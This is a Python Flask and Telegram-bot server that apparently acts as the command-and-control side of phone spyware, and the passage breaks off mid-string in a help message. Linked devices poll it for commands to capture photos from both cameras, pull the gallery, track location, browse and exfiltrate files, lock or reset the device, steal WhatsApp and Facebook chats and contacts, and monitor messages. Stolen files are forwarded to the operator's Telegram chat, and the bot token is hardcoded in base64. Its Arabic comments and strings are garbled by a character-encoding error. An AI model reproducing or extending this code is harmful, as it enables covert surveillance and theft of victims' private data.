#!/usr/bin/env python3
"""
newfile_storage_access.py (ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ ØªØ®Ø²ÙŠÙ† Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„ØªØ­ÙƒÙ… Ø§Ù„ÙƒØ§Ù…Ù„)
"""

import os
import time
import json
import sqlite3
import base64
import threading
import imghdr
import requests
from datetime import datetime
from flask import Flask, request, jsonify, send_file
from werkzeug.utils import secure_filename
from PIL import Image
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, ReplyKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext, MessageHandler, Filters

# --- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ---
UPLOAD_DIR = 'uploads'
DB_PATH = 'devices.db'
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ØªÙˆÙƒÙ† Ù…Ø´ÙØ±
TOKEN_ENCODED = "Nzc2MzE1Njc3NzpBQUZHMkhFZ3B4MlpkNDN4N2doMWo0YWNTVm9sNHQ5cnpxOA=="
TELEGRAM_BOT_TOKEN = base64.b64decode(TOKEN_ENCODED).decode("utf-8")
DEFAULT_OWNER_ID = 8064703280

# ÙƒÙŠØ¨ÙˆØ±Ø¯ Ø³ÙÙ„ÙŠ Ù…Ø¹ Ø£Ø²Ø±Ø§Ø± Ù…Ø­Ø³Ù†Ø©
main_keyboard = ReplyKeyboardMarkup([
    ["ğŸ”— Ø£Ù†Ø´Ø£ Ø±Ø§Ø¨Ø· Ø±Ø¨Ø·", "ğŸ“‹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©", "â“ Ø§Ù„Ù…Ø³Ø§Ø¹Ø¯Ø©"],
    ["ğŸ“¸ Ø³Ø­Ø¨ ØµÙˆØ±", "ğŸ“ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬Ù‡Ø§Ø²", "â„¹ï¸ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²"],
    ["ğŸ“ Ø§Ø³ØªØ¹Ø±Ø§Ø¶ Ø§Ù„Ù…Ù„ÙØ§Øª", "ğŸ“¥ ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù", "ğŸ“¤ Ø±ÙØ¹ Ù…Ù„Ù"],
    ["ğŸ—‘ï¸ Ø­Ø°Ù Ø§Ù„Ø¬Ù‡Ø§Ø²", "ğŸ“· ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ù…Ø§Ù…ÙŠØ©", "ğŸ¥ ÙƒØ§Ù…ÙŠØ±Ø§ Ø®Ù„ÙÙŠØ©"],
    ["ğŸ–¼ï¸ Ù…Ø¹Ø±Ø¶ Ø§Ù„ØµÙˆØ±", "ğŸ“ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„", "ğŸ“± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©"],
    ["ğŸ”’ Ù‚ÙÙ„ Ø§Ù„Ø´Ø§Ø´Ø©", "ğŸ“± Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª"]  # Ø£Ø¶ÙÙ†Ø§ Ø²Ø± Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª
], resize_keyboard=True)

app = Flask(__name__)

# --- DB init + schema update ---

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (id INTEGER PRIMARY KEY,
                  token TEXT UNIQUE,
                  user_id INTEGER,
                  status TEXT,
                  device_info TEXT,
                  connection_url TEXT,
                  last_reported_at TEXT,
                  last_ip TEXT,
                  last_photo_path TEXT,
                  delete_requested INTEGER DEFAULT 0,
                  take_photo_requested INTEGER DEFAULT 0,
                  location_requested INTEGER DEFAULT 0,
                  message_request TEXT,
                  call_requested INTEGER DEFAULT 0,
                  front_camera_requested INTEGER DEFAULT 0,
                  back_camera_requested INTEGER DEFAULT 0,
                  gallery_requested INTEGER DEFAULT 0,
                  reset_requested INTEGER DEFAULT 0,
                  lock_requested INTEGER DEFAULT 0,
                  contacts_requested INTEGER DEFAULT 0,
                  network_info_requested INTEGER DEFAULT 0,
                  file_browse_requested INTEGER DEFAULT 0,
                  file_download_requested TEXT,
                  file_upload_requested TEXT,
                  app_photos_requested TEXT,  -- Ø¬Ø¯ÙŠØ¯: Ù„ØªØ®Ø²ÙŠÙ† Ø§Ø³Ù… Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨ Ø³Ø­Ø¨ ØµÙˆØ±Ù‡
                  chats_data_requested TEXT,  -- Ø¬Ø¯ÙŠØ¯: Ù„ØªØ®Ø²ÙŠÙ† Ø§Ø³Ù… Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨ Ø³Ø­Ø¨ Ù…Ø­Ø§Ø¯Ø«Ø§ØªÙ‡
                  contacts_requested_app TEXT, -- Ø¬Ø¯ÙŠØ¯: Ù„ØªØ®Ø²ÙŠÙ† Ø§Ø³Ù… Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨ Ø³Ø­Ø¨ Ø¬Ù‡Ø§Øª Ø§ØªØµØ§Ù„Ù‡
                  shared_files_requested TEXT, -- Ø¬Ø¯ÙŠØ¯: Ù„ØªØ®Ø²ÙŠÙ† Ø§Ø³Ù… Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨ Ø³Ø­Ø¨ Ù…Ù„ÙØ§ØªÙ‡
                  message_monitoring INTEGER DEFAULT 0, -- Ø¬Ø¯ÙŠØ¯: Ù„ØªÙØ¹ÙŠÙ„/Ø¥Ù„ØºØ§Ø¡ Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
                  monitored_app TEXT,          -- Ø¬Ø¯ÙŠØ¯: Ø§Ø³Ù… Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ù…Ø±Ø§Ø¯ Ù…Ø±Ø§Ù‚Ø¨ØªÙ‡
                  created_at TEXT DEFAULT CURRENT_TIMESTAMP)
              ''')
    
    # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø£Ø¹Ù…Ø¯Ø© ÙˆØ¥Ø¶Ø§ÙØªÙ‡Ø§ Ø¥Ø°Ø§ Ù„Ù… ØªÙƒÙ† Ù…ÙˆØ¬ÙˆØ¯Ø©
    c.execute("PRAGMA table_info(devices)")
    existing_columns = [column[1] for column in c.fetchall()]
    
    columns_to_add = [
        ('delete_requested', 'INTEGER DEFAULT 0'),
        ('take_photo_requested', 'INTEGER DEFAULT 0'),
        ('location_requested', 'INTEGER DEFAULT 0'),
        ('message_request', 'TEXT'),
        ('call_requested', 'INTEGER DEFAULT 0'),
        ('front_camera_requested', 'INTEGER DEFAULT 0'),
        ('back_camera_requested', 'INTEGER DEFAULT 0'),
        ('gallery_requested', 'INTEGER DEFAULT 0'),
        ('reset_requested', 'INTEGER DEFAULT 0'),
        ('lock_requested', 'INTEGER DEFAULT 0'),
        ('contacts_requested', 'INTEGER DEFAULT 0'),
        ('network_info_requested', 'INTEGER DEFAULT 0'),
        ('file_browse_requested', 'INTEGER DEFAULT 0'),
        ('file_download_requested', 'TEXT'),
        ('file_upload_requested', 'TEXT'),
        ('app_photos_requested', 'TEXT'),
        ('chats_data_requested', 'TEXT'),
        ('contacts_requested_app', 'TEXT'),
        ('shared_files_requested', 'TEXT'),
        ('message_monitoring', 'INTEGER DEFAULT 0'),
        ('monitored_app', 'TEXT')
    ]
    
    for column_name, column_type in columns_to_add:
        if column_name not in existing_columns:
            try:
                c.execute(f"ALTER TABLE devices ADD COLUMN {column_name} {column_type}")
                print(f"ØªÙ… Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø¹Ù…ÙˆØ¯ {column_name} Ø¥Ù„Ù‰ Ø§Ù„Ø¬Ø¯ÙˆÙ„")
            except sqlite3.Error as e:
                print(f"Ø®Ø·Ø£ ÙÙŠ Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø¹Ù…ÙˆØ¯ {column_name}: {e}")
    
    conn.commit()
    conn.close()

init_db()

# --- DB helpers ---

def create_device_for_user(user_id):
    token = base64.b64encode(os.urandom(18)).decode('ascii').replace('+', '-').replace('/', '_').rstrip('=')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO devices (token, user_id, status, connection_url) VALUES (?, ?, ?, ?)",
              (token, user_id, 'disconnected', None))
    conn.commit()
    conn.close()
    return token

def token_is_valid(token):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id FROM devices WHERE token=?", (token,))
    r = c.fetchone()
    conn.close()
    return bool(r)

def set_device_last_seen(token, ip=None, info_json=None, photo_path=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    fields = []
    params = []
    if info_json is not None:
        fields.append('device_info=?')
        params.append(info_json)
    if ip is not None:
        fields.append('last_ip=?')
        params.append(ip)
    if photo_path is not None:
        fields.append('last_photo_path=?')
        params.append(photo_path)
    fields.append('last_reported_at=?')
    params.append(datetime.utcnow().isoformat())
    fields.append('status=?')
    params.append('connected')
    params.append(token)
    sql = f"UPDATE devices SET {', '.join(fields)} WHERE token=?"
    c.execute(sql, tuple(params))
    conn.commit()
    conn.close()

def get_user_devices(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, token, status, created_at FROM devices WHERE user_id=?", (user_id,))
    rows = c.fetchall()
    conn.close()
    return rows

def get_device_by_token(token):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, token, user_id, status, device_info, last_photo_path, last_reported_at, delete_requested, take_photo_requested, location_requested, message_request, call_requested, front_camera_requested, back_camera_requested, gallery_requested, reset_requested, lock_requested, contacts_requested, network_info_requested, file_browse_requested, file_download_requested, file_upload_requested, app_photos_requested, chats_data_requested, contacts_requested_app, shared_files_requested, message_monitoring, monitored_app FROM devices WHERE token=?", (token,))
    r = c.fetchone()
    conn.close()
    return r

# --- Endpoint Ø¬Ø¯ÙŠØ¯ Ù„Ø·Ù„Ø¨ Ø³Ø­Ø¨ ØµÙˆØ± Ù…Ù† Ø§Ù„Ù…Ø¹Ø±Ø¶ ---

@app.route('/request_gallery/<token>', methods=['POST'])
def request_gallery(token):
    if not token_is_valid(token):
        return jsonify({"status":"error","message":"invalid token"}), 403
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE devices SET gallery_requested=1 WHERE token=?", (token,))
    conn.commit()
    conn.close()
    return jsonify({"status":"success","message":"gallery images requested"})

# --- Endpoints Ø¬Ø¯ÙŠØ¯Ø© Ù„Ø·Ù„Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª ---

@app.route('/request_app_photos/<token>', methods=['POST'])
def request_app_photos(token):
    if not token_is_valid(token):
        return jsonify({"status":"error","message":"invalid token"}), 403
    
    data = request.get_json()
    app_name = data.get('app', 'all')
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE devices SET app_photos_requested=? WHERE token=?", (app_name, token))
    conn.commit()
    conn.close()
    
    return jsonify({"status":"success","message":f"Ø·Ù„Ø¨ Ø³Ø­Ø¨ ØµÙˆØ± Ù…Ù† {app_name}"})

@app.route('/request_chats_data/<token>', methods=['POST'])
def request_chats_data(token):
    if not token_is_valid(token):
        return jsonify({"status":"error","message":"invalid token"}), 403
    
    data = request.get_json()
    app_name = data.get('app', 'whatsapp')
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE devices SET chats_data_requested=? WHERE token=?", (app_name, token))
    conn.commit()
    conn.close()
    
    return jsonify({"status":"success","message":f"Ø·Ù„Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø­Ø§Ø¯Ø«Ø§Øª {app_name}"})

@app.route('/request_contacts_app/<token>', methods=['POST'])
def request_contacts_app(token):
    if not token_is_valid(token):
        return jsonify({"status":"error","message":"invalid token"}), 403
    
    data = request.get_json()
    app_name = data.get('app', 'all')
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE devices SET contacts_requested_app=? WHERE token=?", (app_name, token))
    conn.commit()
    conn.close()
    
    return jsonify({"status":"success","message":f"Ø·Ù„Ø¨ Ø¬Ù‡Ø§Øª Ø§ØªØµØ§Ù„ {app_name}"})

@app.route('/request_shared_files/<token>', methods=['POST'])
def request_shared_files(token):
    if not token_is_valid(token):
        return jsonify({"status":"error","message":"invalid token"}), 403
    
    data = request.get_json()
    app_name = data.get('app', 'all')
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE devices SET shared_files_requested=? WHERE token=?", (app_name, token))
    conn.commit()
    conn.close()
    
    return jsonify({"status":"success","message":f"Ø·Ù„Ø¨ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø±Ø³Ù„Ø© ÙÙŠ {app_name}"})

@app.route('/monitor_messages/<token>', methods=['POST'])
def monitor_messages(token):
    if not token_is_valid(token):
        return jsonify({"status":"error","message":"invalid token"}), 403
    
    data = request.get_json()
    app_name = data.get('app', 'all')
    enable = data.get('enable', True)
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE devices SET message_monitoring=?, monitored_app=? WHERE token=?", (1 if enable else 0, app_name, token))
    conn.commit()
    conn.close()
    
    status = "ØªÙØ¹ÙŠÙ„" if enable else "Ø¥ÙŠÙ‚Ø§Ù"
    return jsonify({"status":"success","message":f"{status} Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ ÙÙŠ {app_name}"})

@app.route('/receive_app_data/<token>', methods=['POST'])
def receive_app_data(token):
    if not token_is_valid(token):
        return jsonify({"status":"error","message":"invalid token"}), 403
    
    # Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Ø§Ù„Ø¬Ù‡Ø§Ø²
    files = request.files.getlist('files')
    data = request.form.get('data', '{}')
    app_name = request.form.get('app', 'unknown')
    
    data_dict = json.loads(data)
    device_info = get_device_by_token(token)
    user_id = device_info[2] if device_info else DEFAULT_OWNER_ID
    
    # Ø­ÙØ¸ Ø§Ù„Ù…Ù„ÙØ§Øª ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§ Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…
    for file in files:
        if file.filename:
            filename = secure_filename(f"{app_name}_{token}_{file.filename}")
            save_path = os.path.join(UPLOAD_DIR, filename)
            file.save(save_path)
            
            # Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø­Ø³Ø¨ Ù†ÙˆØ¹ Ø§Ù„Ù…Ù„Ù
            try:
                if filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                    updater.bot.send_photo(chat_id=user_id, photo=open(save_path, 'rb'))
                else:
                    updater.bot.send_document(chat_id=user_id, document=open(save_path, 'rb'))
            except Exception as e:
                print(f"ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„Ù: {e}")
    
    # Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù†ØµÙŠØ©
    if data_dict:
        summary = f"ğŸ“Š Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† {app_name}:\n"
        for key, value in data_dict.items():
            summary += f"{key}: {value}\n"
        
        updater.bot.send_message(chat_id=user_id, text=summary)
    
    return jsonify({"status":"success","message":"ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"})

# --- Endpoint Ù„ÙØ­Øµ Ø§Ù„Ø£ÙˆØ§Ù…Ø± (ÙŠØªÙ… ØªØ­Ø¯ÙŠØ«Ù‡ Ù„ÙŠØ´Ù…Ù„ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©) ---

@app.route('/check_commands/<token>', methods=['GET'])
def check_commands(token):
    if not token_is_valid(token):
        return jsonify({"status":"error","message":"invalid token"}), 403
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT delete_requested, take_photo_requested, location_requested, message_request, call_requested, front_camera_requested, back_camera_requested, gallery_requested, reset_requested, lock_requested, contacts_requested, network_info_requested, file_browse_requested, file_download_requested, file_upload_requested, app_photos_requested, chats_data_requested, contacts_requested_app, shared_files_requested, message_monitoring, monitored_app FROM devices WHERE token=?", (token,))
    row = c.fetchone()
    conn.close()
    if not row:
        return jsonify({"status":"error","message":"no device"}), 404
    
    commands = {
        "delete_requested": bool(row[0]),
        "take_photo_requested": bool(row[1]),
        "location_requested": bool(row[2]),
        "message_request": row[3],
        "call_requested": bool(row[4]),
        "front_camera_requested": bool(row[5]),
        "back_camera_requested": bool(row[6]),
        "gallery_requested": bool(row[7]),
        "reset_requested": bool(row[8]),
        "lock_requested": bool(row[9]),
        "contacts_requested": bool(row[10]),
        "network_info_requested": bool(row[11]),
        "file_browse_requested": bool(row[12]),
        "file_download_requested": row[13],
        "file_upload_requested": row[14],
        "app_photos_requested": row[15],
        "chats_data_requested": row[16],
        "contacts_requested_app": row[17],
        "shared_files_requested": row[18],
        "message_monitoring": bool(row[19]),
        "monitored_app": row[20]
    }
    return jsonify(commands)

# --- Endpoint Ù„ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡ (ÙŠØªÙ… ØªØ­Ø¯ÙŠØ«Ù‡ Ù„ÙŠØ´Ù…Ù„ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©) ---

@app.route('/confirm_action/<token>', methods=['POST'])
def confirm_action(token):
    if not token_is_valid(token):
        return jsonify({"status":"error","message":"invalid token"}), 403
    data = request.get_json(silent=True) or {}
    action = data.get('action')
    if not action:
        return jsonify({"status":"error","message":"no action provided"}), 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    if action == 'take_photo':
        c.execute("UPDATE devices SET take_photo_requested=0 WHERE token=?", (token,))
    elif action == 'location':
        c.execute("UPDATE devices SET location_requested=0 WHERE token=?", (token,))
    elif action == 'message':
        c.execute("UPDATE devices SET message_request=NULL WHERE token=?", (token,))
    elif action == 'call':
        c.execute("UPDATE devices SET call_requested=0 WHERE token=?", (token,))
    elif action == 'front_camera':
        c.execute("UPDATE devices SET front_camera_requested=0 WHERE token=?", (token,))
    elif action == 'back_camera':
        c.execute("UPDATE devices SET back_camera_requested=0 WHERE token=?", (token,))
    elif action == 'gallery':
        c.execute("UPDATE devices SET gallery_requested=0 WHERE token=?", (token,))
    elif action == 'reset':
        c.execute("UPDATE devices SET reset_requested=0 WHERE token=?", (token,))
    elif action == 'lock':
        c.execute("UPDATE devices SET lock_requested=0 WHERE token=?", (token,))
    elif action == 'contacts':
        c.execute("UPDATE devices SET contacts_requested=0 WHERE token=?", (token,))
    elif action == 'network_info':
        c.execute("UPDATE devices SET network_info_requested=0 WHERE token=?", (token,))
    elif action == 'file_browse':
        c.execute("UPDATE devices SET file_browse_requested=0 WHERE token=?", (token,))
    elif action == 'file_download':
        c.execute("UPDATE devices SET file_download_requested=NULL WHERE token=?", (token,))
    elif action == 'file_upload':
        c.execute("UPDATE devices SET file_upload_requested=NULL WHERE token=?", (token,))
    elif action == 'app_photos':
        c.execute("UPDATE devices SET app_photos_requested=NULL WHERE token=?", (token,))
    elif action == 'chats_data':
        c.execute("UPDATE devices SET chats_data_requested=NULL WHERE token=?", (token,))
    elif action == 'contacts_app':
        c.execute("UPDATE devices SET contacts_requested_app=NULL WHERE token=?", (token,))
    elif action == 'shared_files':
        c.execute("UPDATE devices SET shared_files_requested=NULL WHERE token=?", (token,))
    elif action == 'monitor_messages':
        c.execute("UPDATE devices SET message_monitoring=0, monitored_app=NULL WHERE token=?", (token,))
    else:
        conn.close()
        return jsonify({"status":"error","message":"unknown action"}), 400
    conn.commit()
    conn.close()
    return jsonify({"status":"success","message":"action confirmed"})

# --- endpoint Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ ---

@app.route('/connect/<token>', methods=['GET', 'POST'])
def connect_device(token):
    if not token_is_valid(token):
        return jsonify({"status":"error","message":"invalid token"}), 403
    
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', 'Unknown')
    full_url = request.url
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE devices SET connection_url=?, last_ip=?, last_reported_at=?, status=? WHERE token=?",
              (full_url, ip, datetime.utcnow().isoformat(), 'connected', token))
    conn.commit()
    c.execute("SELECT user_id FROM devices WHERE token=?", (token,))
    row = c.fetchone()
    conn.close()
    
    owner = (row[0] if row and row[0] else DEFAULT_OWNER_ID)
    
    try:
        text = f"ğŸ”— Ø¬Ù‡Ø§Ø² Ø§ØªØµÙ„ Ø¹Ø¨Ø± Ø§Ù„Ø±Ø§Ø¨Ø·.\nToken: {token}\nIP: {ip}\nUA: {ua}\n\nØ§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ø¢Ù† Ù…ØªØµÙ„ ÙˆÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠÙ‡ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„."
        
        # Ø²Ø± Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„ØªØ®Ø²ÙŠÙ†
        kb = InlineKeyboardMarkup([[
            InlineKeyboardButton('ğŸ“ Ø§Ø³ØªØ¹Ø±Ø§Ø¶ Ø§Ù„Ù…Ù„ÙØ§Øª', callback_data=f'storage:{token}:browse'),
            InlineKeyboardButton('ğŸ“¥ ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù', callback_data=f'storage:{token}:download')
        ],[
            InlineKeyboardButton('ğŸ“¤ Ø±ÙØ¹ Ù…Ù„Ù', callback_data=f'storage:{token}:upload'),
            InlineKeyboardButton('ğŸ“¸ ÙƒØ§Ù…ÙŠØ±Ø§', callback_data=f'action:{token}:camera')
        ],[
            InlineKeyboardButton('ğŸ–¼ï¸ Ù…Ø¹Ø±Ø¶ Ø§Ù„ØµÙˆØ±', callback_data=f'action:{token}:gallery'),
            InlineKeyboardButton('ğŸ“ Ù…ÙˆÙ‚Ø¹', callback_data=f'action:{token}:location')
        ],[
            InlineKeyboardButton('ğŸ“± Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª', callback_data=f'apps:{token}:menu')
        ]])
        
        updater.bot.send_message(chat_id=owner, text=text, reply_markup=kb)
    except Exception as e:
        print('Ø¥Ø´Ø¹Ø§Ø± Ø§Ù„Ù…Ø§Ù„Ùƒ ÙØ´Ù„:', e)
    
    return (
        "<html><body>"
        "<h3>ØªÙ… Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ± Ø¨Ù†Ø¬Ø§Ø­ âœ…</h3>"
        "<p>Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ø¢Ù† Ù…ØªØµÙ„ ÙˆÙŠÙ…ÙƒÙ† Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠÙ‡ Ø¹Ù† Ø¨Ø¹Ø¯.</p>"
        "<p>ÙŠÙ…ÙƒÙ†Ùƒ Ø¥ØºÙ„Ø§Ù‚ Ù‡Ø°Ù‡ Ø§Ù„ØµÙØ­Ø©.</p>"
        "</body></html>"
    )

# --- Ø¯ÙˆØ§Ù„ Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„Ù„ÙˆØ­Ø© Ø§Ù„Ù…ÙØ§ØªÙŠØ­ Ù„Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª ---

def create_apps_keyboard(token):
    keyboard = [
        [InlineKeyboardButton("ğŸ“¸ ØµÙˆØ± Ø§Ù„ÙˆØ§ØªØ³Ø§Ø¨", callback_data=f"app:{token}:whatsapp:photos")],
        [InlineKeyboardButton("ğŸ“¸ ØµÙˆØ± Ø§Ù„ÙÙŠØ³Ø¨ÙˆÙƒ", callback_data=f"app:{token}:facebook:photos")],
        [InlineKeyboardButton("ğŸ“¸ ØµÙˆØ± Ø§Ù„Ø¥Ù†Ø³ØªØ¬Ø±Ø§Ù…", callback_data=f"app:{token}:instagram:photos")],
        [InlineKeyboardButton("ğŸ“¸ ØµÙˆØ± Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…", callback_data=f"app:{token}:telegram:photos")],
        [InlineKeyboardButton("ğŸ’¬ Ù…Ø­Ø§Ø¯Ø«Ø§Øª Ø§Ù„ÙˆØ§ØªØ³Ø§Ø¨", callback_data=f"app:{token}:whatsapp:chats")],
        [InlineKeyboardButton("ğŸ’¬ Ù…Ø­Ø§Ø¯Ø«Ø§Øª Ø§Ù„ÙÙŠØ³Ø¨ÙˆÙƒ", callback_data=f"app:{token}:facebook:chats")],
        [InlineKeyboardButton("ğŸ‘¥ Ø¬Ù‡Ø§Øª Ø§ØªØµØ§Ù„ Ø§Ù„ÙˆØ§ØªØ³Ø§Ø¨", callback_data=f"app:{token}:whatsapp:contacts")],
        [InlineKeyboardButton("ğŸ“ Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø±Ø³Ù„Ø©", callback_data=f"app:{token}:all:files")],
        [InlineKeyboardButton("ğŸ‘€ Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ø±Ø³Ø§Ø¦Ù„", callback_data=f"app:{token}:all:monitor")]
    ]
    return InlineKeyboardMarkup(keyboard)

# --- Telegram bot handlers ---

def start(update: Update, context: CallbackContext):
    welcome_text = """
Ù…Ø±Ø­Ø¨Ø§Ù‹ Ø¨Ùƒ ÙÙŠ Ø¨ÙˆØª Ø§Ù„ØªØ­ÙƒÙ… Ø¹Ù† Ø¨Ø¹Ø¯ Ø§Ù„Ù…ØªÙ‚Ø¯Ù…! ğŸ¤–

Ù…ÙŠØ²Ø§Øª Ø§Ù„Ø¨ÙˆØª:
ğŸ“¸ - Ø³Ø­Ø¨ Ø§Ù„ØµÙˆØ± Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© ÙˆØ§Ù„Ø®Ù„ÙÙŠØ©
ğŸ–¼ï¸ - Ø³Ø­Ø¨ Ø§Ù„ØµÙˆØ± Ù…Ù† Ù…Ø¹Ø±Ø¶ Ø§Ù„Ø¬Ù‡Ø§Ø²
ğŸ“ - ØªØªØ¨Ø¹ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬Ù‡Ø§Ø² Ø¨Ø¯Ù‚Ø©
ğŸ“ - Ø§Ù„ÙˆØµÙˆÙ„ Ø§Ù„ÙƒØ§Ù…Ù„ Ø¥Ù„Ù‰ ØªØ®Ø²ÙŠÙ† Ø§Ù„Ø¬Ù‡Ø§Ø²
ğŸ“¥ - ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø§Ù„Ø¬Ù‡Ø§Ø²
ğŸ“¤ - Ø±ÙØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª Ø¥Ù„Ù‰ Ø§Ù„Ø¬Ù‡Ø§Ø²
ğŸ“± - Ø³Ø­Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª (Ø§Ù„ÙˆØ§ØªØ³Ø§Ø¨ØŒ Ø§Ù„ÙÙŠØ³Ø¨ÙˆÙƒØŒ Ø§Ù„Ø¥Ù†Ø³ØªØ¬Ø±Ø§Ù…ØŒ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…)

Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ "ğŸ”— Ø£Ù†Ø´Ø£ Ø±Ø§Ø¨Ø· Ø±Ø¨Ø·" Ù„Ø¨Ø¯Ø¡ Ø±Ø¨Ø· Ø¬Ù‡Ø§Ø²Ùƒ.
    """
    update.message.reply_text(welcome_text, reply_markup=main_keyboard)

def help_cmd(update: Update, context: CallbackContext):
    help_text = """
â“ Ø¯Ù„ÙŠÙ„ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙˆØª:

1. Ø§Ø¶ØºØ· "ğŸ”— Ø£Ù†Ø´Ø£ Ø±Ø§Ø¨Ø· Ø±Ø¨Ø·" Ù„Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø· Ù„Ø±Ø¨Ø· Ø¬Ù‡Ø§Ø²Ùƒ
